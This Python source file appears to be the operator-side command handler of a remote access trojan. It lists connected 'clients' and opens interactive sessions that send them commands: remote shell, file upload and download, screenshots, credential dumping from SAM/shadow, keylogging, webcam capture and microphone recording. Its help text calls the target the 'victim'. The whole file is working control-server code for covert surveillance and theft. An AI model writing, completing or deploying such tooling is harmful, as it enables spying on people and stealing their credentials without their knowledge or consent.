from typing import Optional
from .logger import logger

REMOTE_COMMANDS = {
    "help",
    "download",
    "upload",
    "shell",
    "ipconfig",
    "screenshot",
    "search",
    "hashdump",
    "keylogger",
    "webcam_snapshot",
    "webcam_stream",
    "record_audio"
}

def handle_command(command: str, client_manager):
    parts = command.strip().split()

    if not parts:
        return

    cmd = parts[0].lower()

    if cmd == "list":
        list_clients(client_manager)

    elif cmd == "interact":
        if len(parts) < 2:
            logger.debug("[!] Usage: interact <client_id>")
            return

        interact_with_client(parts[1], client_manager)

    elif cmd == "help":
        show_help()

    else:
        logger.error(f"[!] Unknown command: {cmd}")


#-------------- COMMANDS IMPLEMENTATION -------------#
def list_clients(client_manager):
    clients = client_manager.get_all()

    if not clients:
        logger.info("No connected clients.")
        return

    logger.info("Connected clients:")
    logger.info("-" * 40)

    for client in clients:
        info = client.info()

        logger.info(
            f"ID: {info['id']} | IP: {info['ip']} | Status: {info['status']}"
        )

    logger.info("-" * 40)


def interact_with_client(client_id: str, client_manager):
    client = client_manager.get(client_id)

    if not client:
        logger.warning("Client not found.")
        return

    logger.info(f"Session started with {client.id} ({client.addr[0]})")

    while True:
        try:
            cmd = input(f"session({client.id}) > ").strip()

            if not cmd:
                continue

            # ------ LOCAL COMMANDS ------- #
            if cmd == "back":
                logger.info("Leaving session...")
                break

            if cmd == "help":
                session_help()
                continue

            if cmd == "disconnect":
                client.send("__DISCONNECT__")
                client.close()
                client_manager.remove(client.id)
                logger.warning("Client disconnected")
                break

            # --------- VALIDATE REMOTE COMMAND ---------#
            base_cmd = cmd.split()[0]

            if base_cmd not in REMOTE_COMMANDS:
                logger.warning("Unknown command")
                continue

            # --------- SEND TO CLIENT --------#
            client.send(cmd)

            response = client.receive()

            if response:
                logger.info(response)
            else:
                logger.warning("No response")

        except KeyboardInterrupt:
            logger.warning("Use 'back' to exit session")

        except Exception as e:
            logger.exception(f"Session error: {e}")
            break


#---------- SESSION COMMANDS ---------#
def send_command_to_client(command: str, client):
    try:
        client.send(command)
        response = client.receive()

        if response:
            print(response)
        else:
            logger.error("[!] No response.")

    except Exception as e:
        logger.exception(f"[!] Error communicating with client: {e}")


def print_client_info(client):
    logger.info("\nClient info:")
    logger.info(f"ID      : {client.id}")
    logger.info(f"IP      : {client.ip}")
    logger.info(f"Status  : {client.status}")
    logger.info("")


def handle_upload(command: str, client):
    parts = command.split()

    if len(parts) < 3:
        logger.debug("[!] Usage: upload <local_path> <remote_path>")
        return

    local_path = parts[1]
    remote_path = parts[2]

    try:
        from file_transfer import upload_file
        upload_file(client, local_path, remote_path)
        logger.critical("[+] File uploaded.")

    except Exception as e:
        logger.exception(f"[!] Upload failed: {e}")


def handle_download(command: str, client):
    parts = command.split()

    if len(parts) < 3:
        logger.debug("[!] Usage: download <remote_path> <local_path>")
        return

    remote_path = parts[1]
    local_path = parts[2]

    try:
        from file_transfer import download_file
        download_file(client, remote_path, local_path)
        logger.critical("[+] File downloaded.")

    except Exception as e:
        logger.exception(f"[!] Download failed: {e}")


#----------- HELPERS --------------#
def show_help():
    logger.debug("""
Server commands:
    list                List connected clients
    interact <id>       Interact with a client
    help                Show this help
    exit                Exit server
""")


def session_help():
    logger.info("""
Available commands:

help               Show this help
back               Exit session
disconnect         Disconnect client

download           Get file from victim
upload             Send file to victim
shell              Open remote shell
ipconfig           Network configuration
screenshot         Capture screen
search             Find file on system
hashdump           Dump credentials (SAM/shadow)
keylogger          Start keylogging
webcam_snapshot    Take webcam photo
webcam_stream      Live webcam feed
record_audio       Record microphone
""")